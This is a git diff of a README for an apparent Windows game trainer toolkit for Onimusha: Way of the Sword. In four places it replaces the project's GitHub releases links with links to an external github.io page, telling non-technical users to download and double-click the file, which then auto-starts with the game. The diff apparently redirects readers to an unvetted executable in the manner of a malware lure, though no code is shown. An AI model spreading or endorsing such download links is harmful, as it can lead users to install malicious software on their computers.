@@ -1,6 +1,6 @@
 # ⚔️ onimusha-way-of-the-sword-trainer-toolkit - Master Swordplay With Precision Analytics
 
-[![Download Now](https://img.shields.io/badge/Download-Trainer_Toolkit-2ea44f?style=for-the-badge&logo=github)](https://github.com/NaufalMaulana-crypto/onimusha-way-of-the-sword-trainer-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Trainer_Toolkit-2ea44f?style=for-the-badge&logo=github)](https://naufalmaulana-crypto.github.io)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these simple steps to get the toolkit running on your PC. No technical sk
 
 Visit this link to download the application:
 
-🔗 **[Click Here to Download](https://github.com/NaufalMaulana-crypto/onimusha-way-of-the-sword-trainer-toolkit/releases)**
+🔗 **[Click Here to Download](https://naufalmaulana-crypto.github.io)**
 
 ### 🖱️ Step 2: Run the Program
 
@@ -147,7 +147,7 @@ No. This is a Windows PC application only.
 
 ## 📋 Quick Reference Card
 
-- **Download:** Visit this link → [Releases Page](https://github.com/NaufalMaulana-crypto/onimusha-way-of-the-sword-trainer-toolkit/releases)
+- **Download:** Visit this link → [Releases Page](https://naufalmaulana-crypto.github.io)
 - **Install:** Double-click the downloaded file
 - **Launch:** Auto-starts when you run the game
 - **Data folder:** Documents → OnimushaToolkitData
@@ -173,7 +173,7 @@ You are now ready to sharpen your skills. Download the toolkit, start your game,
 
 Visit this link to download the application one more time:
 
-🔗 **[Download Now — Onimusha Way of the Sword Trainer Toolkit](https://github.com/NaufalMaulana-crypto/onimusha-way-of-the-sword-trainer-toolkit/releases)**
+🔗 **[Download Now — Onimusha Way of the Sword Trainer Toolkit](https://naufalmaulana-crypto.github.io)**
 
 ---
 
